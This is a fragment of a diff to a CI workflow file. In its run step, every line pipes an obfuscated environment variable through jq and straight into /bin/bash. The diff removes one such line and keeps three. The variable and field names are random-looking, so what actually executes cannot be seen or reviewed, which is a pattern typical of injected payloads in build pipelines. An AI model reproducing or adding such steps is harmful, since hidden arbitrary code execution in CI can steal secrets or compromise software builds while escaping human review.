@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$oyf48159" | jq -r .l25 | /bin/bash
           echo $klbdw105 | jq -r .bli12213 | /bin/bash
-          printf '%s' "$pir97" | jq -r .wtfa07 | /bin/bash
           echo $b1 | jq -r .zyhm2786 | /bin/bash
 
       - name: Archive results
